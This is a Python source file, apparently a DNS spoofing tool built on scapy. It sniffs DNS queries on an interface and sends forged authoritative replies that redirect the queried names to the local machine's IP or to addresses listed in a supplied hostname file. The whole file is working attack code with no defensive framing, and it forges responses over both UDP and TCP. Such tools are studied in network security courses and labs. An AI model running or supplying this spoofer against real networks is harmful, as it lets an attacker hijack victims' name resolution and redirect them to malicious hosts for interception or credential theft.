#!/usr/bin/python

import sys
import argparse
import socket
import netifaces as nif
from scapy.all import *

def dns_sniff(pkt):
    udp = False
    tcp = False
    redirect_ip = local_ip
    if pkt.haslayer(IP): 
        src_ip = pkt[IP].src
        dest_ip = pkt[IP].dst
        if pkt.haslayer(TCP):
            tcp = True
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
        elif pkt.haslayer(UDP):
            udp = True
            sport = pkt[UDP].sport
            dport = pkt[UDP].dport
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
            dns_id = pkt[DNS].id
            dns_qd = pkt[DNS].qd
            dns_qname = dns_qd.qname
            if args.hostname is not None:
                fp = open(args.hostname, "r")
                for line in fp:
                    if dns_qname.rstrip('.') in line:
                        hostname_list = line.split()
                        redirect_ip = hostname_list[0]
            if (udp):
                modified_pkt =  IP(src=dest_ip, dst=src_ip)/ \
                                UDP(sport=dport, dport=sport)/ \
                                DNS(id=dns_id, qd=dns_qd, aa=1, qr=1, an=DNSRR(rrname=dns_qd.qname, ttl=10, rdata=redirect_ip))
            elif (tcp):
                modified_pkt =  IP(src=dest_ip, dst=src_ip)/ \
                                TCP(sport=dport, dport=sport)/ \
                                DNS(id=dns_id, qd=dns_qd, aa=1, qr=1, an=DNSRR(rrname=dns_qd.qname, ttl=10, rdata=redirect_ip))
            send(modified_pkt)
            print modified_pkt.summary()

if __name__ == "__main__":
    global local_ip
    parser = argparse.ArgumentParser(add_help=False)
    local_interface = nif.gateways()['default'][nif.AF_INET][1]
    parser.add_argument("-i", "--interface", default=local_interface)
    parser.add_argument("-h", "--hostname")
    parser.add_argument("expr", nargs='*', action="store", default='', help="BPF Filter")
    args = parser.parse_args()
    nif.ifaddresses(args.interface)
    local_ip = nif.ifaddresses(args.interface)[nif.AF_INET][0]['addr']
    sniff(filter=str(args.expr), iface=str(args.interface), store=0, prn=dns_sniff)
